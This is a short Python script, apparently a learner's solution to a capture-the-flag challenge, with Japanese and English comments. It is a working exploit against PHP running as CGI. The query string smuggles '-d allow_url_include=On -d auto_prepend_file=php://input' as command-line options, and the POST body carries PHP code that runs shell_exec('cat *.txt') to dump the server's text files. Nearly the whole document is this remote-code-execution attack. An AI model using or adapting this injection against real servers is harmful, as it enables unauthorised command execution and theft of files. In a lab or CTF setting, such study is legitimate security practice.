import urllib

import requests  # httpモジュール

url = 'http://ctfq.sweetduet.info:10080/~q12/index.php'
originalUrl = 'http: // ctfq.sweetduet.info: 10080/~q12/'
# index.htmlとindex.phpは同類で即ち~q12に飛ぶ時自動でこのindex.phpに一般に飛ばされる?
# ?はGETの関連だと思う。
# The first option enable an attacker retrieve the remote files which are located in the remote locations .逆の視点から見ると鯖がそれらの許可を与える。
# The second argument enable an attacker read the data,and an attacker specified that is readonly.
# php://input is a read-only stream that allows you to read raw data from the request body.
code = '?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input'
#  auto_prepend_file string
#     Specifies the name of a file that is automatically parsed before the main file. The file is included as if it was called with the require function, so include_path is used.

values = '''
<?php
$textFiles=shell_exec('cat *.txt');
echo $textFiles;
return;
?>
'''

req = requests.post(url+code, data=values)

#クエリが"="を含まない時、コマンドライン引数はPHPコマンドとして解釈される.

print(req.text)

